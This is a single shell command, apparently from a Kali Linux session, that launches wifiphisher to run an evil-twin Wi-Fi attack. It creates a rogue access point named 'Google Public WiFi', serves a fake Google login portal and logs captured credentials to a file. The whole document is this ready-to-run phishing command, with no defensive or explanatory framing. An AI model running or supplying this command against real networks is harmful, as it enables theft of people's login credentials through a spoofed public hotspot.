...
sudo wifiphisher -pPD /home/kali/working/phisher/portals -p google-login -eI wlan1mon -aI wlan1ap -nD --essid "Google Public WiFi" --logging -lP /home/kali/working/phisher/logs/log -cP /home/kali/working/phisher/creds/cred
